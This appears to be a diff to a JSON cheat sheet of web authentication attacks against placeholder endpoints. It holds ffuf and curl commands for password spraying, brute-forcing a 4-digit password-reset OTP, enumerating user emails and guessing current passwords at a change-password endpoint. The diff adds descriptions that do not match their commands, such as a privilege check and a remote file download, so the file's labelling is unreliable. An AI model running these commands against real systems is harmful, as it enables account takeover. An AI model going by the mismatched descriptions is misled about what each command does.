@@ -12,22 +12,26 @@
     {
       "command": "ffuf -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -u http://<target>/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"<known_email>\", \"Password\": \"PASS\"}' -fr \"Invalid Credentials\" -t 50",
       "caption": "Password spray against single known email address",
-      "label": "Brute password (known email)"
+      "label": "Brute password (known email)",
+      "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
     },
     {
       "command": "curl -X POST http://<target>/api/v1/authentication/customers/passwords/resets/email-otps -H \"Content-Type: application/json\" -d '{\"Email\": \"<email>\"}'\nffuf -u http://<target>/api/v1/authentication/customers/passwords/resets -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"<email>\", \"OTP\": \"FUZZ\", \"NewPassword\": \"NewP@ssw0rd1\"}' -w <(seq -w 0000 9999):FUZZ -t 50 -mr '\"SuccessStatus\":true'",
       "caption": "OTP brute-force: trigger reset then immediately fuzz 4-digit OTP (0000-9999)",
-      "label": "POST request"
+      "label": "POST request",
+      "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
     },
     {
       "command": "ffuf -w <userlist>:EMAIL -u http://<target>/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"<common_pass>\"}' -fr \"Invalid Credentials\" -mc 200",
       "caption": "Username/email enumeration with fixed password",
-      "label": "Brute email (known password)"
+      "label": "Brute email (known password)",
+      "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
     },
     {
       "command": "ffuf -w <wordlist>:PASS -u http://<target>/api/v1/authentication/sign-in -X POST -H \"Content-Type: application/json\" -H \"Authorization: Bearer <jwt>\" -d '{\"currentPassword\": \"PASS\", \"newPassword\": \"NewPass1!\"}' -fr \"incorrect\" -t 30",
       "caption": "Brute-force authenticated password-change endpoint",
-      "label": "Brute current-password (change-pw)"
+      "label": "Brute current-password (change-pw)",
+      "description": "Lists active network connections and listening ports. Identifies internal services, database connections, and potential pivoting targets not visible from external scans."
     }
   ],
   "examples": [
